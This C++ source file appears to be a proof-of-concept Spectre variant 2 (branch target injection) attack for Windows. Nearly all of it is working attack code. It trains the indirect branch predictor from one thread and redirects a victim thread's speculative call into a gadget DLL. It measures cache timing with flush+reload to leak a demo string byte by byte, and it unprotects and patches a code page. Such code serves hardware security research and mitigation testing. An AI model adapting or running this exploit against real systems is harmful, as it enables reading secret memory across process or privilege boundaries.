#include <windows.h>
#include <intrin.h>
#include <stdio.h>
#include <cstdint>
#include <vector>

extern "C" {
  void LoadGadget();
  void IndirectCall(const void *proc,
                    const void *target_memory,
                    const void *probe_start);

  uint32_t memory_access(LPCBYTE);
  uint32_t flush_reload(LPCBYTE);
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
constexpr int probe_lines = 256;
DWORD_PTR tat[probe_lines];
uint8_t *probe = nullptr;

auto gadget_module = GetModuleHandle(L"gadget.dll");
void (*Touch)(uint8_t*, uint8_t*) = nullptr;
void do_nothing(uint8_t*, uint8_t*) {}

DWORD WINAPI ProbingThread(LPVOID) {
  for (int i = 0; i < probe_lines; ++i)
    _mm_clflush(&probe[i * 4096]);
  for (int trial = 1; ; ++trial) {
    for (int i = 0; i < probe_lines; ++i) {
      auto t = flush_reload(probe + i * 4096);
      if (t < 100) {
        printf("trial#%d: guess='%c' (=%02x) (score=%d)\n",
               trial,
               static_cast<uint8_t>(i),
               static_cast<uint8_t>(i),
               static_cast<uint32_t>(t));
        trial = 0;
        break;
      }
    }
  }
}

DWORD WINAPI TrainingThread(LPVOID) {
  void (*target_proc)(uint8_t*, uint8_t*) = Touch;
  void *call_destination = reinterpret_cast<void*>(&target_proc);
  for (;;) {
    IndirectCall(call_destination, nullptr, nullptr);
  }
}

void victim_thread(const void *target, bool do_probe) {
  void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
  void *call_destination = reinterpret_cast<void*>(&target_proc);

  for (;;) {
    for (int trial = 0; trial < 20000; ++trial) {
      if (do_probe) {
        for (int i = 0; i < probe_lines; ++i)
          _mm_clflush(&probe[i * 4096]);
      }
      else {
        // This is strange.  For some reason, flushing the probe on the victim side
        // helps getting repro.  Need to find a way to get rid of this hack later.
        for (int i = 0; i < probe_lines; ++i)
          _mm_clflush(&probe[i * 4096]);
      }

      Sleep(100);
      IndirectCall(call_destination, target, probe);

      if (!do_probe) continue;

      for (int i = 0; i < probe_lines; ++i)
        tat[i] = flush_reload(probe + i * 4096);

      int idx_min = 0;
      for (int i = 0; i < probe_lines; ++i)
        if (tat[i] < tat[idx_min]) idx_min = i;
      if (tat[idx_min] < 100) {
        printf("trial#%d: guess='%c' (=%02x) (score=%d)\n",
               trial,
               static_cast<uint8_t>(idx_min),
               static_cast<uint8_t>(idx_min),
               static_cast<uint32_t>(tat[idx_min]));
        break;
      }
    }
  }
}

bool JailbreakMemoryPage(LPVOID target) {
  DWORD old;
  return !!VirtualProtect(reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(target) & ~0xfff),
                          0x1000,
                          PAGE_EXECUTE_WRITECOPY,
                          &old);
}

struct spectre_mode {
  uint8_t victim : 1;
  uint8_t probe : 1;
  uint8_t train : 1;
};

spectre_mode parse_options(int argc, char *argv[]) {
  spectre_mode modes{};
  for (int i = 1; i < argc; ++i) {
    if (strcmp(argv[i], "--victim") == 0) modes.victim = 1;
    if (strcmp(argv[i], "--probe") == 0) modes.probe = 1;
    if (strcmp(argv[i], "--train") == 0) modes.train = 1;
  }
  return modes;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    printf("USAGE: spectre --victim|--train [--probe]\n\n");
    return 1;
  }

  auto modes = parse_options(argc, argv);
  if (!modes.victim && !modes.train) {
    printf("--victim or --train needs to be specified.\n");
    return 1;
  }
  if (modes.victim && modes.train) {
    printf("--victim and --train cannot be specified on the same process.\n");
    return 1;
  }

  LoadGadget();
  auto section = FindResource(gadget_module, L"DATA", RT_BITMAP);
  probe = reinterpret_cast<uint8_t*>(reinterpret_cast<DWORD_PTR>(section) & ~0xfff);
  Touch = reinterpret_cast<void(*)(uint8_t*, uint8_t*)>(GetProcAddress(gadget_module, "Touch"));

  const int affinity_victim = 1;
  const int affinity_probe = 2;
  const int affinity_train = 1; // must be the same as affinity_victim
  const int offset = argc >= 3 ? atoi(argv[argc - 1]) : 0;

  if (modes.victim) {
    if (modes.probe)
      printf("Starting the victim thread with probing on cpu#%d...\n\n", affinity_victim);
    else
      printf("Starting the victim thread on cpu#%d...\n\n", affinity_victim);
    SetThreadAffinityMask(GetCurrentThread(), 1 << affinity_victim);
    victim_thread(TheAnswer + offset, modes.probe);
  }
  else if (modes.train) {
    if (!JailbreakMemoryPage(Touch)) {
      printf("Oops, you could not unprotect the pages\n");
      return 1;
    }

    *reinterpret_cast<uint8_t*>(Touch) = 0xC3;

    DWORD tid;
    std::vector<HANDLE> threads;
    threads.push_back(CreateThread(/*lpThreadAttributes*/nullptr,
                                   /*dwStackSize*/0,
                                   TrainingThread,
                                   /*lpParameter*/nullptr,
                                   CREATE_SUSPENDED,
                                   &tid));
    SetThreadAffinityMask(threads[0], 1 << affinity_train);
    printf("Starting the training thread on cpu#%d...\n", affinity_train);
    ResumeThread(threads[0]);

    if (modes.probe) {
      threads.push_back(CreateThread(/*lpThreadAttributes*/nullptr,
                                     /*dwStackSize*/0,
                                     ProbingThread,
                                     /*lpParameter*/nullptr,
                                     CREATE_SUSPENDED,
                                     &tid));
      SetThreadAffinityMask(threads[1], 1 << affinity_probe);
      printf("Starting the probing thread on cpu#%d...\n", affinity_probe);
      ResumeThread(threads[1]);
    }

    WaitForMultipleObjects(static_cast<DWORD>(threads.size()),
                           threads.data(),
                           /*bWaitAll*/TRUE,
                           INFINITE);
    for (auto it : threads) CloseHandle(it);
  }
  return 0;
}
